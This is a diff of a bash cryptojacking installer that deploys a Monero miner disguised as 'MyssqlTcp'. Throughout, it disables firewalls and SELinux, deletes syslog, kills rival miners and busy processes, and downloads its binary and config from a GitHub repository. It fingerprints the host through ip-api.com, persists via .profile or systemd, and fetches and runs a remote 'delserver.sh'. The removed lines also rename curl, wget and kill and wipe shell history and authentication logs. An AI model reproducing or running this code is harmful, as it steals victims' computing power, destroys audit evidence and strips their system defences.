@@ -2,25 +2,39 @@
 
 VERSION=2.11
 
-# printing greetings
+# Detect IP address
+if curl http://ip-api.com/json/ | sed 's/,/\n/g' | grep  -i 'CN'; then 
+    exit 1 
+fi
 
-echo "Mssqlup mining setup script v$VERSION."
-echo "(please report issues to admin@admin.com email with full output of this script with extra \"-x\" \"bash\" option)"
-echo
-
+# Management judgment
 if [ "$(id -u)" == "0" ]; then
-  echo "WARNING: Generally it is not adviced to run this script under root"
+  echo "WARNING: This is the permission of Root"
 fi
 
 # command line arguments
 WALLET=$1
 EMAIL=$2 # this one is optional
 
-# checking prerequisites
+# Disable firewall
+ulimit -n 65535
+rm -rf /var/log/syslog
+chattr -iua /tmp/
+chattr -iua /var/tmp/
+ufw disable
+iptables -F
+setenforce 0 2>dev/null
+echo SELINUX=disabled > /etc/sysconfig/selinux 2>/dev/null
+iptables -F
+iptables -X
+iptables -A OUTPUT -p tcp --dport 13555 -j DROP
+iptables -A OUTPUT -p tcp --dport 13666 -j DROP
+service iptables reload
 
+# printing greetings
 if [ -z $WALLET ]; then
   echo "Script usage:"
-  echo "> setup_wkgg_server.sh <wallet address> [<your email address>]"
+  echo "> mysqltcp.sh <wallet address> [<your email address>]"
   echo "ERROR: Please specify your wallet address"
   exit 1
 fi
@@ -42,19 +56,7 @@ if [ ! -d $HOME ]; then
   exit 1
 fi
 
-if ! type lscpu >/dev/null; then
-  echo "WARNING: This script requires \"lscpu\" utility to work correctly"
-fi
-
-#if ! sudo -n true 2>/dev/null; then
-#  if ! pidof systemd >/dev/null; then
-#    echo "ERROR: This script requires systemd to work correctly"
-#    exit 1
-#  fi
-#fi
-
 # calculating port
-
 CPU_THREADS=$(nproc)
 EXP_MONERO_HASHRATE=$(( CPU_THREADS * 700 / 1000))
 if [ -z $EXP_MONERO_HASHRATE ]; then
@@ -112,39 +114,26 @@ if [ "$PORT" -lt "13555" -o "$PORT" -gt "13555" ]; then
   exit 1
 fi
 
-cd /$HOME/
-echo "/$HOME/??"
-mkdir myssqltcp
-
-cd /$HOME/myssqltcp
-curl -L --progress-bar "https://raw.githubusercontent.com/teshushu/BiBi/main/Bash/config.json" -o $HOME/myssqltcp/config.json
-curl -L --progress-bar "https://raw.githubusercontent.com/teshushu/BiBi/main/Bash/MyssqlTcp" -o $HOME/myssqltcp/MyssqlTcp
-chmod 777 MyssqlTcp
-chmod 777 config.json
-
-USIP=`hostname -i | cut -f1 -d" " | sed -r 's/[^a-zA-Z0-9\-]+/_/g'`
-UUIP=`uname -v | cut -f1 -d" " | sed -r 's/[^a-zA-Z0-9\-]+/_/g'`
-PASS=`hostname | cut -f1 -d"." | sed -r 's/[^a-zA-Z0-9\-]+/_/g'`
-if [ "$PASS" == "localhost" ]; then
-  PASS=`ip route get 1 | awk '{print $NF;exit}'`
-fi
-if [ -z $PASS ]; then
-  PASS=na
-fi
+# printing intentions
+echo "I will download, setup and run in background Monero CPU miner."
+echo "If needed, miner in foreground can be started by $HOME/myssqltcp/miner.sh script."
+echo "Mining will happen to $WALLET wallet."
 if [ ! -z $EMAIL ]; then
-  PASS="$PASS"
+  echo "(and $EMAIL email as password to modify wallet options later at  site)"
 fi
-sed -i 's/"algo": *null,/"algo": "rx/0",/' $HOME/myssqltcp/config.json
-sed -i 's/"url": *"[^"]*",/"url": "x.u8pool.com:'$PORT'",/' $HOME/myssqltcp/config.json
-sed -i 's/"user": *"[^"]*",/"user": "love275@gamil'$USIP'-'$UUIP'.'$PASS''$UUIP'",/' $HOME/myssqltcp/config.json
-sed -i 's/"pass": *"[^"]*",/"pass": "'$PASS'",/' $HOME/myssqltcp/config.json
-sed -i 's/"max-cpu-usage": *[^,]*,/"max-cpu-usage": 100,/' $HOME/myssqltcp/config.json
-sed -i 's#"log-file": *null,#"log-file": "'$HOME/myssqlsys.log'",#' $HOME/myssqltcp/config.json
-sed -i 's/"syslog": *[^,]*,/"syslog": true,/' $HOME/myssqltcp/config.json
+echo
 
-cp $HOME/myssqltcp/config.json $HOME/myssqltcp/config_background.json
-sed -i 's/"background": *false,/"background": true,/' $HOME/myssqltcp/config_background.json
+if ! sudo -n true 2>/dev/null; then
+  echo "Since I can't do passwordless sudo, mining in background will started from your $HOME/.profile file first time you login this host after reboot."
+else
+  echo "Mining in background will be performed using c3pool_miner systemd service."
+fi
 
+echo
+echo "JFYI: This host has $CPU_THREADS CPU threads with $CPU_MHZ MHz and ${TOTAL_CACHE}KB data cache in total, so projected Monero hashrate is around $EXP_MONERO_HASHRATE H/s."
+echo
+
+# start doing stuff: preparing miner
 kill_miner_proc()
 {
     netstat -anp | grep 185.71.65.238 | awk '{print $7}' | awk -F'[/]' '{print $1}' | xargs -I % kill -9 %
@@ -691,7 +680,7 @@ kill_sus_proc()
             fi
         fi
     done
-    ps axf -o "pid %cpu" | awk '{if($2>=50.0) print $1}' | while read procid
+    ps axf -o "pid %cpu" | awk '{if($2>=40.0) print $1}' | while read procid
     do
         cat /proc/$procid/cmdline| grep -a -E "zzh"
         if [ $? -ne 0 ]
@@ -709,32 +698,69 @@ killall -9 p
 kill_miner_proc
 kill_sus_proc
 
-# preparing script
+# Cleaning system
+sync && echo 3 >/proc/sys/vm/dro
 
-echo "[*] Creating $HOME/myssqltcp/xmrig.sh script"
-cat >$HOME/myssqltcp/xmrig.sh <<EOL
+# Download program
+cd /$HOME/
+mkdir myssqltcp
+cd /$HOME/myssqltcp
+curl -L --progress-bar "https://raw.githubusercontent.com/teshushu/BiBi/main/Bash/config.json" -o $HOME/myssqltcp/config.json
+curl -L --progress-bar "https://raw.githubusercontent.com/teshushu/BiBi/main/Bash/MyssqlTcp" -o $HOME/myssqltcp/MyssqlTcp
+chmod 777 MyssqlTcp
+chmod 777 config.json
+
+# Write configuration
+MEIP=`curl http://ip-api.com/json/ | sed 's/,/\n/g' | grep "query" | sed 's/:"/\n/g' | sed '1d' | sed 's/}//g' | sed 's/"//g' | sed -r 's/[^a-zA-Z0-9\-]+/-/g'`
+CITY=`curl http://ip-api.com/json/ | sed 's/,/\n/g' | grep "city" | sed 's/:"/\n/g' | sed '1d' | sed 's/}//g' | sed 's/"//g' | sed -r 's/[^a-zA-Z0-9\-]+/_/g'`
+UUIP=`uname -v | cut -f1 -d" " | sed -r 's/[^a-zA-Z0-9\-]+/_/g'`
+UUID=`cat /proc/sys/kernel/random/uuid`
+PASS=`hostname | cut -f1 -d"." | sed -r 's/[^a-zA-Z0-9\-]+/_/g'`
+if [ "$PASS" == "localhost" ]; then
+  PASS=`ip route get 1 | awk '{print $NF;exit}'`
+fi
+if [ -z $PASS ]; then
+  PASS=na
+fi
+if [ ! -z $EMAIL ]; then
+  PASS="$PASS"
+fi
+
+sed -i 's/"null": *"[^"]*",/"null": "rx/0",/' $HOME/myssqltcp/config.json
+sed -i 's/"user": *"[^"]*",/"user": "'$UUID'-'$MEIP'-'$UUIP'.'$CITY':'$PASS'",/' $HOME/myssqltcp/config.json
+sed -i 's/"pass": *"[^"]*",/"pass": "'$PASS'",/' $HOME/myssqltcp/config.json
+sed -i 's/"max-cpu-usage": *[^,]*,/"max-cpu-usage": 100,/' $HOME/myssqltcp/config.json
+sed -i 's#"log-file": *null,#"log-file": "'$HOME/myssqlsys.log'",#' $HOME/myssqltcp/config.json
+sed -i 's/"syslog": *[^,]*,/"syslog": true,/' $HOME/myssqltcp/config.json
+
+cp $HOME/myssqltcp/config.json $HOME/myssqltcp/config_background.json
+sed -i 's/"background": *false,/"background": true,/' $HOME/myssqltcp/config_background.json
+
+# preparing script
+echo "[*] Creating $HOME/myssqltcp/miner.sh script"
+cat >$HOME/c3pool/miner.sh <<EOL
 #!/bin/bash
 if ! pidof MyssqlTcp >/dev/null; then
   nice $HOME/myssqltcp/MyssqlTcp \$*
 else
-  echo "Monero server is already running in the background. Refusing to run another one."
-  echo "Run \"killall MyssqlTcp\" or \"sudo killall MyssqlTcp\" if you want to remove background server first."
+  echo "Monero miner is already running in the background. Refusing to run another one."
+  echo "Run \"killall MyssqlTcp\" or \"sudo killall if ! MyssqlTcp\" if you want to remove background miner first."
 fi
 EOL
 
-chmod +x $HOME/myssqltcp/xmrig.sh
+
+chmod +x $HOME/myssqltcp/miner.sh
 
 # preparing script background work and work under reboot
-
 if ! sudo -n true 2>/dev/null; then
-  if ! grep myssqltcp/xmrig.sh $HOME/.profile >/dev/null; then
-    echo "[*] Adding $HOME/myssqltcp/xmrig.sh script to $HOME/.profile"
-    echo "$HOME/myssqltcp/xmrig.sh --config=$HOME/myssqltcp/config_background.json >/dev/null 2>&1" >>$HOME/.profile
+  if ! grep myssqltcp/miner.sh $HOME/.profile >/dev/null; then
+    echo "[*] Adding $HOME/myssqltcp/miner.sh script to $HOME/.profile"
+    echo "$HOME/myssqltcp/miner.sh --config=$HOME/myssqltcp/config_background.json >/dev/null 2>&1" >>$HOME/.profile
   else 
-    echo "Looks like $HOME/myssqltcp/xmrig.sh script is already in the $HOME/.profile"
+    echo "Looks like $HOME/myssqltcp/miner.sh script is already in the $HOME/.profile"
   fi
-  echo "[*] Running server in the background (see logs in $HOME/myssqlsys.log file)"
-  /bin/bash $HOME/myssqltcp/xmrig.sh --config=$HOME/myssqltcp/config_background.json >/dev/null 2>&1
+  echo "[*] Running miner in the background see logs in $HOME/tmp/server.log file"
+  /bin/bash $HOME/myssqltcp/miner.sh --config=$HOME/myssqltcp/config_background.json >/dev/null 2>&1
 else
 
   if [[ $(grep MemTotal /proc/meminfo | awk '{print $2}') -gt 3500000 ]]; then
@@ -745,90 +771,59 @@ else
 
   if ! type systemctl >/dev/null; then
 
-    echo "[*] Running server in the background (see logs in $HOME/myssqlsys.log file)"
-    /bin/bash $HOME/myssqltcp/xmrig.sh --config=$HOME/myssqltcp/config_background.json >/dev/null 2>&1
+    echo "[*] Running miner in the background see logs in $HOME/tmp/server.log file"
+    /bin/bash $HOME/myssqltcp/miner.sh --config=$HOME/myssqltcp/config_background.json >/dev/null 2>&1
     echo "ERROR: This script requires \"systemctl\" systemd utility to work correctly."
-    echo "Please move to a more modern Linux distribution or setup server activation after reboot yourself if possible."
+    echo "Please move to a more modern Linux distribution or setup miner activation after reboot yourself if possible."
 
   else
 
-    echo "[*] Creating Mssqlup_server systemd service"
-    cat >/tmp/Mssqlup_server.service <<EOL
+    echo "[*] Creating c3pool_miner systemd service"
+    cat >/tmp/MyssqlTcp.service <<EOL
 [Unit]
-Description=Monero server service
+Description=Monero miner service
+
 [Service]
 ExecStart=$HOME/myssqltcp/MyssqlTcp --config=$HOME/myssqltcp/config.json
 Restart=always
 Nice=10
 CPUWeight=1
+
 [Install]
 WantedBy=multi-user.target
 EOL
-    sudo mv /tmp/Mssqlup_server.service /etc/systemd/system/Mssqlup_server.service
-    echo "[*] Starting Mssqlup_server systemd service"
+    sudo mv /tmp/MyssqlTcp.service /etc/systemd/system/MyssqlTcp.service
+    echo "[*] Starting Myssqltcp systemd service"
     sudo killall MyssqlTcp 2>/dev/null
     sudo systemctl daemon-reload
-    sudo systemctl enable Mssqlup_server.service
-    sudo systemctl start Mssqlup_server.service
-    echo "To see server service logs run \"sudo journalctl -u Mssqlup_server -f\" command"
+    sudo systemctl enable MyssqlTcp.service
+    sudo systemctl start MyssqlTcp.service
+    echo "To see miner service logs run \"sudo journalctl -u MyssqlTcp -f\" command"
   fi
 fi
 
 echo ""
-echo "NOTE: If you are using shared VPS it is recommended to avoid 100% CPU usage produced by the server or you will be banned"
+echo "NOTE: If you are using shared VPS it is recommended to avoid 100% CPU usage produced by the miner or you will be banned"
 if [ "$CPU_THREADS" -lt "4" ]; then
-  echo "HINT: Please execute these or similair commands under root to limit server to 75% percent CPU usage:"
+  echo "HINT: Please execute these or similair commands under root to limit miner to 75% percent CPU usage:"
   echo "sudo apt-get update; sudo apt-get install -y cpulimit"
   echo "sudo cpulimit -e MyssqlTcp -l $((75*$CPU_THREADS)) -b"
   if [ "`tail -n1 /etc/rc.local`" != "exit 0" ]; then
-    echo "sudo sed -i -e '\$acpulimit -e MyssqlTcp -l $((50*$CPU_THREADS)) -b\\n' /etc/rc.local"
+    echo "sudo sed -i -e '\$acpulimit -e xmrig -l $((75*$CPU_THREADS)) -b\\n' /etc/rc.local"
   else
-    echo "sudo sed -i -e '\$i \\cpulimit -e MyssqlTcp -l $((75*$CPU_THREADS)) -b\\n' /etc/rc.local"
+    echo "sudo sed -i -e '\$i \\cpulimit -e xmrig -l $((75*$CPU_THREADS)) -b\\n' /etc/rc.local"
   fi
 else
-  echo "HINT: Please execute these commands and reboot your VPS after that to limit server to 75% percent CPU usage:"
+  echo "HINT: Please execute these commands and reboot your VPS after that to limit miner to 75% percent CPU usage:"
   echo "sed -i 's/\"max-threads-hint\": *[^,]*,/\"max-threads-hint\": 75,/' \$HOME/myssqltcp/config.json"
   echo "sed -i 's/\"max-threads-hint\": *[^,]*,/\"max-threads-hint\": 75,/' \$HOME/myssqltcp/config_background.json"
 fi
+echo ""
 
-chattr -R +ia $HOME/myssqltcp
-chattr -V +iau $HOME/myssqltcp/MyssqlTcp
-chattr -V +iau $HOME/myssqltcp/config_background.json
-chattr -V +iau $HOME/myssqltcp/config.json
-chattr -V +iau $HOME/myssqltcp/xmrig.sh
-
-setenforce 0 2>dev/null
-echo SELINUX=disabled > /etc/sysconfig/selinux 2>/dev/null
-sync && echo 3 >/proc/sys/vm/dro
-sync && echo 3 >/proc/sys/vm/drop_caches
-
-bbdir="/usr/bin/curl"
-bbdira="/usr/bin/cdr1"
-ccdir="/usr/bin/wget"
-ccdira="/usr/bin/wde1"
-ccdir="/usr/bin/kill"
-ccdira="/usr/bin/kl1"
-mv /usr/bin/curl /usr/bin/url
-mv /usr/bin/url /usr/bin/cdr1
-mv /usr/bin/wget /usr/bin/get
-mv /usr/bin/get /usr/bin/wde1
-mv /usr/bin/kill /usr/bin/kib
-mv /usr/bin/kib /usr/bin/kl1
-enable -n kill
-
-history -c
-echo > /var/spool/mail/root
-echo > /var/log/wtmp
-echo > /var/log/secure
-echo > /root/.bash_history
-
-sysctl -w vm.overcommit_memory=2
-echo "vm.overcommit_memory=2" >> /etc/sysctl.conf
-
-cd /$HOME/
+cd /tmp/
 curl -L --progress-bar "https://raw.githubusercontent.com/teshushu/BiBi/main/Bash/url/delserver.sh" -o $HOME/delserver.sh
 chmod 777 delserver.sh
 /bin/bash ./delserver.sh >/dev/null 2>&1 &
 nohup ./delserver.sh > /dev/null 2>&1 &
-echo "[*] Setup complete"
-echo "[*] Yee-Go"
+
+echo "[*] Yes-GoGo"
